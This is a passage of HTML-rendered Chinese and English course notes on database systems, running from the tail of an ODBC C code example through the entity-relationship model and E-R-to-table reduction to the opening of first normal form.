</span><span id="__span-169-21"><a id="__codelineno-169-21" name="__codelineno-169-21" href="#note-db-sql-__codelineno-169-21"></a><span class="w">       </span><span class="n">SQLBindCol</span><span class="p">(</span><span class="n">stmt</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="n">SQL_C_FLOAT</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">balance</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">lenOut2</span><span class="p">);</span><span class="w"> </span>
</span><span id="__span-169-22"><a id="__codelineno-169-22" name="__codelineno-169-22" href="#note-db-sql-__codelineno-169-22"></a><span class="w">       </span><span class="cm">/* 对stmt中的返回结果数据加以分离，并与相应变量绑定。第1项数据转换为C的字符类型，送变量branchname(最大长度为80)，lenOut1为实际字符串长度（若＝-1代表null），第2项数据转换为C的浮点类型送变量balance中 */</span><span class="w"> </span>
</span><span id="__span-169-23"><a id="__codelineno-169-23" name="__codelineno-169-23" href="#note-db-sql-__codelineno-169-23"></a>
</span><span id="__span-169-24"><a id="__codelineno-169-24" name="__codelineno-169-24" href="#note-db-sql-__codelineno-169-24"></a><span class="w">       </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">SQLFetch</span><span class="p">(</span><span class="n">stmt</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">SQL_SUCCESS</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="cm">/* 逐行从数据区stmt中取数据，放到绑定变量中 */</span><span class="w"> </span>
</span><span id="__span-169-25"><a id="__codelineno-169-25" name="__codelineno-169-25" href="#note-db-sql-__codelineno-169-25"></a><span class="w">           </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s  %.2f</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">branchname</span><span class="p">,</span><span class="w"> </span><span class="n">balance</span><span class="p">);</span><span class="w"> </span>
</span><span id="__span-169-26"><a id="__codelineno-169-26" name="__codelineno-169-26" href="#note-db-sql-__codelineno-169-26"></a><span class="w">           </span><span class="cm">/* 对取出的数据进行处理 */</span><span class="w"> </span>
</span><span id="__span-169-27"><a id="__codelineno-169-27" name="__codelineno-169-27" href="#note-db-sql-__codelineno-169-27"></a><span class="w">       </span><span class="p">}</span><span class="w"> </span>
</span><span id="__span-169-28"><a id="__codelineno-169-28" name="__codelineno-169-28" href="#note-db-sql-__codelineno-169-28"></a><span class="w">   </span><span class="p">}</span><span class="w"> </span>
</span><span id="__span-169-29"><a id="__codelineno-169-29" name="__codelineno-169-29" href="#note-db-sql-__codelineno-169-29"></a>
</span><span id="__span-169-30"><a id="__codelineno-169-30" name="__codelineno-169-30" href="#note-db-sql-__codelineno-169-30"></a><span class="w">   </span><span class="n">SQLFreeStmt</span><span class="p">(</span><span class="n">stmt</span><span class="p">,</span><span class="w"> </span><span class="n">SQL_DROP</span><span class="p">);</span><span class="w">  </span><span class="cm">/* 释放数据区 */</span><span class="w"> </span>
</span><span id="__span-169-31"><a id="__codelineno-169-31" name="__codelineno-169-31" href="#note-db-sql-__codelineno-169-31"></a><span class="w">   </span><span class="n">SQLDisconnect</span><span class="p">(</span><span class="n">conn</span><span class="p">);</span><span class="w"> </span>
</span><span id="__span-169-32"><a id="__codelineno-169-32" name="__codelineno-169-32" href="#note-db-sql-__codelineno-169-32"></a><span class="w">   </span><span class="n">SQLFreeConnect</span><span class="p">(</span><span class="n">conn</span><span class="p">);</span><span class="w"> </span>
</span><span id="__span-169-33"><a id="__codelineno-169-33" name="__codelineno-169-33" href="#note-db-sql-__codelineno-169-33"></a><span class="w">   </span><span class="n">SQLFreeEnv</span><span class="p">(</span><span class="n">env</span><span class="p">);</span><span class="w"> </span>
</span><span id="__span-169-34"><a id="__codelineno-169-34" name="__codelineno-169-34" href="#note-db-sql-__codelineno-169-34"></a><span class="p">}</span>
</span></code></pre></div>
</div>
<p>JDBC（Java Database Connectivity）是Java语言中用于连接和操作数据库的API。它提供了一种标准的方法，使Java应用程序能够与各种数据库进行交互。JDBC允许开发者执行SQL语句、检索和更新数据库中的数据。</p></section><section class="print-page" id="note-db-er" heading-number="2.2.1.5"><h1 id="note-db-er-entity-relationship-model">Entity Relationship Model<a class="headerlink" href="#note-db-er-entity-relationship-model" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3582 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 27 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 12 分钟</p>
</div>
<div class="admonition definition">
<p class="admonition-title">Steps of Database design</p>
<ul>
<li>Requirement analysis</li>
<li>Conceptual database design,一般在这个阶段使用ER图来描述数据库的结构</li>
<li>Logical database design,将ER图转换为关系模式</li>
<li>Schema refinement,对关系模式进行优化</li>
<li>Physical database design,选择合适的数据库管理系统，并进行优化</li>
<li>Implementation,将数据库设计文档转换为实际的数据库</li>
</ul>
</div>
<h2 id="note-db-er-entity-sets">Entity Sets<a class="headerlink" href="#note-db-er-entity-sets" title="Permanent link">&para;</a></h2>
<p>real world可以由实体的集合与实体之间的联系组成，即</p>
<ul>
<li>Collection of entities</li>
<li>Relationships between entities</li>
</ul>
<div class="admonition definition">
<p class="admonition-title">Entity</p>
<p>An entity is an object that exists and is distinguishable from other objects. --- An entity may be concrete, or abstract. </p>
<p>Entity has attributes, which are the properties of the entity.</p>
<p>Domain is the set of possible values for an attribute.</p>
<p>例如：</p>
<ul>
<li>一个学生,有姓名，年龄，性别，学号等属性</li>
<li>一个课程,有课程名，学分，课程号等属性</li>
<li>一个图书馆,有图书馆名，地址等属性</li>
<li>一个订单,有订单号，订单金额等属性</li>
<li>一个员工,有员工名，员工号等属性</li>
</ul>
</div>
<div class="admonition definition">
<p class="admonition-title">Entity Set</p>
<p>An entity set is a collection of entities that share the same attributes.</p>
<p>例如：</p>
<ul>
<li>一个学生集合</li>
<li>一个课程集合</li>
<li>一个图书馆集合</li>
</ul>
</div>
<div class="admonition definition">
<p class="admonition-title">Relationship</p>
<p>A relationship is a connection between two entities.</p>
</div>
<h3 id="note-db-er-attribute-types">Attribute types<a class="headerlink" href="#note-db-er-attribute-types" title="Permanent link">&para;</a></h3>
<ul>
<li>Simple attribute:原子化，不可分割的属性</li>
<li>
<p>Composite attribute</p>
<ul>
<li>复合属性是由多个简单属性组成的属性。它可以分解为更基本的属性。</li>
<li>例如，地址可以是一个复合属性，它由街道、城市、州和邮政编码等简单属性组成。</li>
<li>使用复合属性的好处是可以更好地组织和管理数据，因为它允许将相关的信息分组在一起。</li>
</ul>
</li>
<li>
<p>Single-valued attribute</p>
<ul>
<li>单值属性是指一个属性只能取一个值。</li>
<li>例如，一个人的姓名只能是一个值。</li>
</ul>
</li>
<li>
<p>Multi-valued attribute</p>
<ul>
<li>多值属性是指一个属性可以有多个值。</li>
<li>例如，一个人的电话号码可以是多值属性，因为一个人可能有多个电话号码（如家庭电话、工作电话、手机等）。</li>
<li>在数据库设计中，处理多值属性时通常需要创建一个独立的表来存储这些值，以便于管理和查询。</li>
</ul>
</li>
</ul>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>简单和复合，单值和多值是属性类型的两个维度。既可以有简单多值属性，也可以有复合单值属性；</p>
</div>
<ul>
<li>Derived attribute<ul>
<li>派生属性是从其他属性计算得出的属性。</li>
<li>例如，一个人的年龄可以从出生日期计算得出。</li>
</ul>
</li>
</ul>
<figure>
    <img alt="" src="../NOTE/DB/img/ER-1.png" width="70%" />
    <figcaption>Attribute Types</figcaption>
</figure>
<p>例如在address这个复合属性中，street也可以是一个复合属性，它是address的一个分量属性；</p>
<h2 id="note-db-er-relationship-sets">Relationship Sets<a class="headerlink" href="#note-db-er-relationship-sets" title="Permanent link">&para;</a></h2>
<p>关系是两个或多个不同类实体之间的关联</p>
<p>一个联系集(relationship set)包含多个同类的联系实例，表示两个或多个实体集之间的关联；</p>
<p>可以这样表示</p>
<div class="arithmatex">\[
\{(e_1, e_2, \ldots, e_n) \mid e_1 \in E_1, e_2 \in E_2, \ldots, e_n \in E_n\}
\]</div>
<p>其中，<span class="arithmatex">\((e_1, e_2, \ldots, e_n)\)</span> 是一个关系，<span class="arithmatex">\(E_i\)</span> 是一个实体集。</p>
<ul>
<li>例如：<span class="arithmatex">\((\text{Jones}, \text{L-17}) \in \text{borrower}\)</span>，其中 <span class="arithmatex">\(\text{Jones} \in \text{customer}\)</span> 且 <span class="arithmatex">\(\text{L-17} \in \text{loan}\)</span></li>
</ul>
<div class="arithmatex">\[
\begin{align*}
(3032111020, 1, 95) \\
(3032111021, 1, 90) \\
(3032111022, 2, 75) \\
\ldots
\end{align*}
\]</div>
<p>属于 <span class="arithmatex">\(\text{student, course}\)</span></p>
<h3 id="note-db-er-degree-and-cardinality">Degree and Cardinality<a class="headerlink" href="#note-db-er-degree-and-cardinality" title="Permanent link">&para;</a></h3>
<p>一个关系集的度(degree)是参与该关系的实体集的个数；</p>
<p>例如：</p>
<ul>
<li>一个二元关系集，表示两个实体集之间的关联；特别的，Relationship sets that involve two entity sets are binary (or degree two). </li>
<li>一个三元关系集，表示三个实体集之间的关联；</li>
</ul>
<p>Mapping Cardinality:</p>
<ul>
<li>
<p>一个实体集可以与另一个实体集有多种关联方式，这种关联方式的数量称为映射基数(mapping cardinality)。</p>
</li>
<li>
<p>One-to-one: 一对一</p>
</li>
<li>One-to-many: 一对多</li>
<li>Many-to-one: 多对一</li>
<li>Many-to-many: 多对多</li>
</ul>
<figure>
    <img alt="" src="../NOTE/DB/img/ER-2.png" width="70%" />
    <img alt="" src="../NOTE/DB/img/ER-3.png" width="70%" />
</figure>
<h3 id="note-db-er-keys-for-relationship-sets">Keys for Relationship Sets<a class="headerlink" href="#note-db-er-keys-for-relationship-sets" title="Permanent link">&para;</a></h3>
<ul>
<li>一个关系集的键(key)是唯一标识该关系集的属性或属性集。通常由参与这个关系的实体集的键组成。</li>
</ul>
<h2 id="note-db-er-er-diagrams">ER Diagrams<a class="headerlink" href="#note-db-er-er-diagrams" title="Permanent link">&para;</a></h2>
<p>ER图是表示实体集和关系集之间关系的一种图形化表示方法。</p>
<figure>
    <img alt="" src="../NOTE/DB/img/ER-4.png" width="80%" />
    <img alt="" src="../NOTE/DB/img/ER-5.png" width="80%" />
</figure>
<ul>
<li>矩形代表Entity Sets</li>
<li>菱形代表Relationship Sets</li>
<li>椭圆代表Attributes<ul>
<li>双椭圆代表multivalued attributes. </li>
<li>虚椭圆代表derived attributes. </li>
<li>没用叶子节点代表Simple attributes. </li>
<li>有叶子节点代表Composite attributes. </li>
<li>下划线代表key attributes. </li>
</ul>
</li>
</ul>
<p>在实体关系模型中，关系的实体集不一定是不同的，这意味着一个实体集可以在同一个关系中扮演多个角色。这种情况被称为自环联系集（Recursive relationship set）。</p>
<figure>
    <img alt="" src="../NOTE/DB/img/ER-6.png" width="80%" />
    <figcaption>Recursive Relationship Set</figcaption>
</figure>
<p><strong>角色（Role）</strong>：在一个关系中，实体所扮演的功能或角色。例如，在“works-for”关系集中，标签“manager”（经理）和“worker”（工人）就是角色；它们指定了员工实体如何通过“works-for”关系集进行交互。</p>
<p>角色标签是可选的，主要用于澄清关系的语义。通过使用角色标签，可以更清晰地表达实体在关系中的具体作用，避免歧义。</p>
<p>使用(-&gt;)表示one，使用（——）表示many,例如在上面的例子中，员工和manager就是一种一对多的关系;</p>
<p>使用这种表示方法就可以表示四种关系</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DB/img/ER-7.png" width="80%" />
    <figcaption>One-to-One</figcaption>
</figure></p>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DB/img/ER-8.png" width="80%" />
    <figcaption>One-to-Many</figcaption>
</figure></p>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DB/img/ER-9.png" width="80%" />
    <figcaption>Many-to-One</figcaption>
</figure></p>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DB/img/ER-10.png" width="80%" />
    <figcaption>Many-to-Many</figcaption>
</figure></p>
</div>
<p>还可以使用单线来表示部分参与，双线来表示全参与</p>
<figure>
    <img alt="" src="../NOTE/DB/img/ER-11.png" width="80%" />
    <figcaption>Partial Participation</figcaption>
</figure>
<p>也可以在线的上方来指定参与度</p>
<figure>
    <img alt="" src="../NOTE/DB/img/ER-12.png" width="80%" />
    <figcaption>Participation Degree</figcaption>
</figure>
<p>在loan的上方有1..1代表每个loan至多至少参与一个borrow关系，而customer的上方有0..*代表每个customer可以不参与任何borrow关系,也可以参与多个borrow关系；</p>
<p>即customer和loan的关系是one-to-many</p>
<h3 id="note-db-er-binary-vs-n-ary-relationships">Binary Vs N-ary Relationships<a class="headerlink" href="#note-db-er-binary-vs-n-ary-relationships" title="Permanent link">&para;</a></h3>
<p>二元关系(Binary Relationship)：涉及两个实体集的关联。</p>
<p>多元关系(N-ary Relationship)：涉及三个或更多实体集的关联。</p>
<p>有些看似非二元的关系可能更适合用二元关系来表示。例如，一个三元关系“父母”，将一个孩子与他的父亲和母亲联系起来，最好用两个二元关系来替代，即“父亲”和“母亲”。</p>
<div class="arithmatex">\[ 
    \text{parents(he, she, child)} \Rightarrow \text{father(he, child), mother(she, child)} 
\]</div>
<p>使用两个二元关系可以表示部分信息，例如，只知道母亲的情况。但是，也有一些关系是自然的非二元关系，例如“works-on(employee, branch, job)”。</p>
<p>但是总的来说，任何非2元关系都可以通过中间的连接实体集来转换为2元关系。</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DB/img/ER-13.png" width="80%" />
    <figcaption>Convert</figcaption>
</figure></p>
<p>其过程可以总结为这样:</p>
<ul>
<li>将有n个度的关系的位置替换为一个中间的实体集E</li>
<li>将E与n个实体集通过n个二元关系连接起来</li>
</ul>
<p>但是也不是唯一的，也可以将原本就存在的实体集作为中间的实体集，例如：</p>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DB/img/ER-14.png" width="80%" />
    <figcaption>Convert</figcaption>
</figure></p>
</div>
<h2 id="note-db-er-weak-entity-sets">Weak Entity Sets<a class="headerlink" href="#note-db-er-weak-entity-sets" title="Permanent link">&para;</a></h2>
<p>在实体关系模型中，一个没有主键的实体集被称为弱实体集(weak entity set)。弱实体集的存在依赖于一个标识实体集(identifying entity set)的存在。弱实体集必须通过一个从标识实体集到弱实体集的全参与、一对多的关系集(identifying relationship set)与标识实体集关联。标识关系用双菱形表示。</p>
<p>弱实体集的判别器discriminator（或部分键）是用于区分弱实体集中所有实体的一组属性。弱实体集的主键由强实体集的主键（弱实体集依赖于其存在的实体集）和弱实体集的判别器组成。</p>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DB/img/ER-15.png" width="80%" />
    <figcaption>Weak Entity Set</figcaption>
</figure></p>
<p>在课程-章节的例子中，course就是强实体集，也是section的依赖实体集(标识实体集)，section就是弱实体集，course_section就是标识关系集。</p>
<p>在section这个weak entity set中，其判别器就是section_id</p>
<p>在弱实体集（weak entity set）中，强实体集的主键通常不会显式地存储，因为它已经隐含在标识关系（identifying relationship）中。也就是说，弱实体集依赖于强实体集的存在，而这种依赖关系通过标识关系来体现。</p>
<p>具体到例子中，如果我们在 <code>section</code>（弱实体集）中显式地存储 <code>course_id</code>（强实体集 <code>course</code> 的主键），那么 <code>section</code> 就可以被视为一个强实体集，因为它不再依赖于 <code>course</code> 的存在来唯一标识自己。然而，这样做会导致 <code>section</code> 和 <code>course</code> 之间的关系被 <code>course_id</code> 这个属性所隐含的关系重复定义。</p>
<p>一个另外的常见的例子是贷款和还贷，loan是强实体集，也是payment的依赖实体集，payment就是弱实体集，loan_payment就是标识关系集。</p>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DB/img/ER-16.png" width="80%" />
    <figcaption>Loan and Payment</figcaption>
</figure></p>
<p>payment是多值属性，因为一个贷款可以有多个还款记录</p>
</div>
<h2 id="note-db-er-extended-e-r-features">Extended E-R Features<a class="headerlink" href="#note-db-er-extended-e-r-features" title="Permanent link">&para;</a></h2>
<h3 id="note-db-er-stratum-of-entity-sets">Stratum of entity sets<a class="headerlink" href="#note-db-er-stratum-of-entity-sets" title="Permanent link">&para;</a></h3>
<ul>
<li>Specialization: 一个实体集可以被分解为多个子实体集，每个子实体集具有不同的属性。<blockquote>
<p>自顶向下的设计过程中我们在一个实体集中指定一些子分组，这些子分组与该实体集中的其他实体有所不同。
这些子分组会成为较低层次的实体集，它们拥有一些不适用于较高层次实体集的属性，或者参与一些较高层次实体集不涉及的关系。
属性继承 —— 较低层次的实体集继承与之相关联的较高层次实体集的所有属性和关系参与情况。</p>
</blockquote>
</li>
</ul>
<figure>
    <img alt="" src="../NOTE/DB/img/ER-17.png" width="80%" />
    <figcaption>Specialization</figcaption>
</figure>
<figure>
    <img alt="" src="../NOTE/DB/img/ER-18.png" width="80%" />
    <figcaption>另外的表示</figcaption>
</figure>
<p>在这里Person可以被细分为employee和customer，而employee又可以继续细分；</p>
<ul>
<li>Generalization: 一个实体集可以被分解为多个子实体集，每个子实体集具有不同的属性。<blockquote>
<p>一种自底向上的设计过程 —— 将多个具有相同特征的实体集合并为一个更高层次的实体集。
特殊化和泛化彼此是简单的逆向过程；它们在实体 - 关系图（E-R 图）中的表示方式相同</p>
</blockquote>
</li>
</ul>
<p>分类的方式既可以是条件定义的(Condition-defined)</p>
<p>例如所有大于65岁的为一组，所有小于18岁的为一组，所有介于18到65岁之间的为一组；</p>
<p>也可以是用户定义的(User-defined)</p>
<h4 id="note-db-er-disjoint-overlapping">Disjoint &amp; Overlapping<a class="headerlink" href="#note-db-er-disjoint-overlapping" title="Permanent link">&para;</a></h4>
<p>Disjoint指两个实体集的交集为空，即两个实体集没有共同的实体。在第二种表示方法种的employee和student是overlapping的；它们分别由两个箭头指向person，但是instructor和secretary就是disjoint的；它们由一个共同的箭头指向employee.</p>
<h4 id="note-db-er-total-partial">Total &amp; Partial<a class="headerlink" href="#note-db-er-total-partial" title="Permanent link">&para;</a></h4>
<p>完全泛化指的是所有的Entity都必须属于泛化出来的其中一个，Partial泛化指的是有些Entity不属于泛化出来的任何一个。</p>
<figure>
    <img alt="" src="../NOTE/DB/img/ER-19.png" width="80%" />
    <figcaption>Total &amp; Partial</figcaption>
</figure>
<h4 id="note-db-er-aggregation">Aggregation<a class="headerlink" href="#note-db-er-aggregation" title="Permanent link">&para;</a></h4>
<p>Express relationships between relationships;</p>
<figure>
    <img alt="" src="../NOTE/DB/img/ER-20.png" width="80%" />
    <figcaption>Aggregation</figcaption>
</figure>
<p>Relationship sets works-on and manages represent overlapping information. </p>
<p>Every manages relationship corresponds to a works-on relationship. </p>
<p>However, some works-on relationships may not correspond to any manages relationships. </p>
<p>So we can’t discard the works-on relationship. </p>
<p>Eliminate this redundancy via aggregation.Treat relationship as an abstract entity. </p>
<p>Allows relationships between relationships. </p>
<p>Abstraction of relationship into new entity. </p>
<p>Without introducing redundancy, the following diagram represents: </p>
<figure>
    <img alt="" src="../NOTE/DB/img/ER-21.png" width="80%" />
    <figcaption>Aggregation</figcaption>
</figure>
<p>An employee works on a particular job at a particular branch. 
An employee, branch, job combination may have an associated manager. </p>
<div class="admonition summary">
<p class="admonition-title">Summary</p>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DB/img/ER-22.png" width="80%" />
    <figcaption>Summary</figcaption>
</figure></p>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DB/img/ER-23.png" width="80%" />
    <figcaption>Summary</figcaption>
</figure></p>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DB/img/ER-24.png" width="80%" />
    <figcaption>Summary</figcaption>
</figure></p>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DB/img/ER-25.png" width="80%" />
    <figcaption>Summary</figcaption>
</figure></p>
</div>
<h2 id="note-db-er-e-r-design-decisions">E-R design Decisions<a class="headerlink" href="#note-db-er-e-r-design-decisions" title="Permanent link">&para;</a></h2>
<ul>
<li>Use an attribute or entity set to represent an object?</li>
</ul>
<p>若一个对象只对其名字及单值感兴趣，则可作为属性，如性别；若一个对象除名字外，本身还有其他属性需描述，则该对象应定义为实体集。如电话, 部门. </p>
<p>一个对象不能同时作为实体和属性. </p>
<p>一个实体集不能与另一实体集的属性相关联，只能实体与实体相联系. </p>
<ul>
<li>Use it as an entity set or a relationship set?</li>
</ul>
<p>两个对象之间发生的动作使用relationship set表示</p>
<ul>
<li>Use it as an attribute of an entity or a relationship?, </li>
</ul>
<p>e.g., student(sid, name, sex, age, …, supervisor-id, supervisor-name, supervisor-position, …, class, monitor) </p>
<p>要从对象的语义独立性和减少数据冗余方面考虑 </p>
<ul>
<li>
<p>The use of a ternary or n-ary relationship versus a pair of binary relationships. </p>
</li>
<li>
<p>The use of a strong or weak entity set. </p>
</li>
<li>
<p>The use of specialization/generalization – contributes to modularity in the design (有助于模块化). </p>
</li>
<li>
<p>The use of aggregation – can group a part of E-R diagram into a single entity set,  and  treat it as a single unit without concern for the details of its internal structure. </p>
</li>
</ul>
<h2 id="note-db-er-reduction-of-an-e-r-schema-to-tables">Reduction of an E-R Schema to Tables<a class="headerlink" href="#note-db-er-reduction-of-an-e-r-schema-to-tables" title="Permanent link">&para;</a></h2>
<blockquote>
<p>Converting an E-R diagram to a table format is the basis for deriving a relational database design from an E-R diagram. </p>
</blockquote>
<p>A database which conforms to an E-R diagram can be represented by a collection of tables.</p>
<p>For each entity set and relationship set, there is a unique table which is assigned the name of the corresponding entity set or relationship set. </p>
<p>Composite attributes are flattened out by creating a separate attribute for each component attribute. 复合属性被展平为每个组件属性创建一个单独的属性。</p>
<p>A multivalued attribute M of an entity E is represented by a separate table EM: 
多值属性M的实体E表示为单独的表EM: </p>
<p>A relationship set is represented as a table with columns for the primary keys of the two participating entity sets, (which are foreign keys here) and any descriptive attributes of the relationship set itself. </p>
<p>即关系集被表示为具有两个参与实体集的主键（这里作为外键）和关系集本身的描述性属性的表。</p>
<p>对于1:n联系，可将“联系”所对应的表，合并到对应“多”端实体的表中
例如</p>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-db-er-__codelineno-0-1"></a>account(account-number, balance); 
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-db-er-__codelineno-0-2"></a>branch(branch-name, branch-city, assets); 
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-db-er-__codelineno-0-3"></a>account-branch(account-number, branch-name) 
</span></code></pre></div>
account是多的一方，可以将account-branch表合并到account表中，得到</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-db-er-__codelineno-1-1"></a>account(account-number, balance, branch-name); 
</span></code></pre></div>
<p>If participation is partial on the many side, replacing a table by an extra attribute in the relation corresponding to the “many” side could result in null values. </p>
<p>E.g., cust-banker(customer-id, employee-id, type); 但有的customer没有banker, 则合并之后得：
Customer(customer-id, cust-name, cust-street, cust-city, banker-id, type) ，导致Customer中有些元组的banker-id、 type为null。 </p>
<p>For one-to-one relationship sets, either side can be chosen to act as the “many” side </p>
<p>The table corresponding to a relationship set linking a weak entity set to its identifying strong entity set is redundant，即对应identifying relationship set的表是多余的，因为存放payment的表可以包含loan的表的主键。这样就直接不需要loan_payment表了。</p>
<p>在泛化中，有两种方式来表示子分组的属性；</p>
<ul>
<li>只包含子分组特有的属性</li>
</ul>
<figure>
    <img alt="" src="../NOTE/DB/img/ER-26.png" width="80%" />
    <figcaption>Specialization</figcaption>
</figure>
<p>但是这样访问子分组需要访问两张表，效率较低</p>
<ul>
<li>包含子分组和父分组共同的属性，共同的属性存在父分组中</li>
</ul>
<figure>
    <img alt="" src="../NOTE/DB/img/ER-27.png" width="80%" />
    <figcaption>Specialization</figcaption>
</figure>
<p>这样会导致一些冗余的存贮；</p></section><section class="print-page" id="note-db-lec7" heading-number="2.2.1.6"><h1 id="note-db-lec7-relational-datavase-design">Relational Datavase design<a class="headerlink" href="#note-db-lec7-relational-datavase-design" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 8186 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 1 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 28 分钟</p>
</div>
<h2 id="note-db-lec7-first-normal-form">First Normal Form<a class="headerlink" href="#note-db-lec7-first-normal-form" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>A relational schema R is infirst normal form(1NF)if the domains of all attributes of R are atomic. </p>
</div>
<p>第一范式（First Normal Form，简称1NF）是数据库规范化过程中的基本范式，也是其他所有高级范式的基础。一个关系模式满足第一范式需要符合以下条件：</p>
<ul>
<li><strong>原子性</strong>：表中的每个属性（列）必须是不可再分的原子值，不允许有复合值或多值属性。</li>
<li><strong>每个关系有一个主键</strong>：每个关系（表）必须有一个主键，用于唯一标识表中的每一行数据。</li>
<li><strong>每个属性只包含单一值</strong>：表中的每个单元格只能包含一个值，不允许有集合、数组或其他多值类型。</li>
</ul>
<p>不符合第一范式的表：</p>
<table>
<thead>
<tr>
<th>学生ID</th>
<th>学生姓名</th>
<th>课程</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>张三</td>
<td>数学, 物理</td>
</tr>
<tr>
<td>2</td>
<td>李四</td>
<td>语文, 历史, 地理</td>
</tr>
</tbody>
</table>
<p>符合第一范式的表：</p>
<table>
<thead>
<tr>
<th>学生ID</th>
<th>学生姓名</th>
<th>课程</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>张三</td>
<td>数学</td>
</tr>
<tr>
<td>1</td>
<td>张三</td>
<td>物理</td>
</tr>
<tr>
<td>2</td>
<td>李四</td>
<td>语文</td>
</tr>
<tr>
<td>2</td>
<td>李四</td>
<td>历史</td>
</tr>
<tr>
<td>2</td>
<td>李四</td>
<td>地理</td>
</tr>
</tbody>
</table>
<div class="admonition eg">
<p class="admonition-title">How to deal with non-atomic values</p>
<ul>
<li>
<p>复合属性：使用多个单独的属性来代替复合值。</p>
</li>
<li>
<p>多值属性：使用多个单独的属性来代替多值属性。或者使用一个单独的表，或者使用single field来表示多值属性。</p>
</li>
</ul>
<p>例如：</p>
<table>
<thead>
<tr>
<th>学生ID</th>
<th>学生姓名</th>
<th>课程</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>张三</td>
<td>数学</td>
</tr>
<tr>
<td>1</td>
<td>张三</td>
<td>物理</td>
</tr>
<tr>
<td>2</td>
<td>李四</td>
<td>语文</td>
</tr>
<tr>
<td>2</td>
<td>李四</td>
<td>历史</td>
</tr>
<tr>
<td>2</td>
<td>李四</td>
<td>地理</td>
</tr>
</tbody>
</table>
<p>可以将课程列分解为两个单独的列：</p>
<table>
<thead>
<tr>
<th>学生ID</th>
<th>学生姓名</th>
<th>课程1</th>
<th>课程2</th>
</tr>
</thead>
<tbody>
<tr>
